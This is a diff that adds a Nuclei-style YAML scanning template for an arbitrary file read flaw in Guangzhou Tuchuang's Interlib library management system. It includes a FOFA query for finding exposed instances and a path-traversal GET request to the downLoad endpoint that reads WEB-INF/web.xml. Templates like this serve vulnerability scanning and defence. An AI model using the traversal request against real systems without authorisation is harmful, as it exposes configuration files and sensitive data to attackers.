@@ -1,0 +1,25 @@
+id: guangzhou-tuchuang-lib-system-download-file-read
+
+info:
+  name: "广州图创图书馆集群管理系统 downLoad 模块任意文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: web.title=="Interlib图书馆集群管理系统"
+          广州图创计算机软件开发有限公司是一家专注于图书馆行业应用软件系统设计、集成及维护服务的高新技术企业，业务涵盖产品研发、应用集成与客户服务。
+          该漏洞允许攻击者通过构造恶意请求读取任意文件内容，可能造成系统配置文件、敏感数据等非授权访问。
+  tags: Interlib
+
+http:
+- raw:
+  - |
+    GET /interlib3/downLoad?file=../WEB-INF/web.xml HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'fonts'
